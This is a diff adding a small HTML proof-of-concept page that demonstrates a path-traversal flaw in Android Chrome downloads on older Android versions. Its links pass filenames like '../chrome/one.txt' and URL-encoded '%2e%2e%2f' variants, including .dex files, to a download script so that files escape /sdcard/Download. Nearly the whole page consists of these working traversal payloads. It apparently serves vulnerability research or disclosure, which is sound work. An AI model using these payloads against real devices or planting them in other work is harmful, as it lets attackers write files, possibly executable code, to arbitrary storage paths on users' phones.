@@ -1,0 +1,20 @@
+<html>
+<head>
+	<title>Android Chrome upload path test</title>
+</head>
+<div>
+Sample demonstrates possibility to download files into arbitrary sd card path. Tested for Android Chrome v. 47.0.2526.83 android 6.0.1, android 4.4.2.
+</div>
+
+<div>	
+	<p>Provided files will be uploaded into /sdcard/chrome/<filename> directory instead of /sdcard/Download</p>
+</div>
+<div>
+	<ul>
+		<li><a href="chrome_download.php?name=../chrome/one.txt">../chrome/one.txt</a></li>
+		<li><a href="chrome_download.php?name=%2e%2e%2fchrome%2fone_enc.txt">%2e%2e%2fchrome%2fone_enc.txt</a></li>
+		<li><a href="chrome_download.php?name=../chrome/two.dex&utf8=true">../chrome/two.dex</a> with utf8 file name attachment</li>
+		<li><a href="chrome_download.php?name=%2e%2e%2fchrome%2ftwo_enc.dex&utf8=true">%2e%2e%2fchrome%2ftwo_enc.dex</a> with utf8 file name attachment</li>		
+	</ul>
+</div>
+</html>
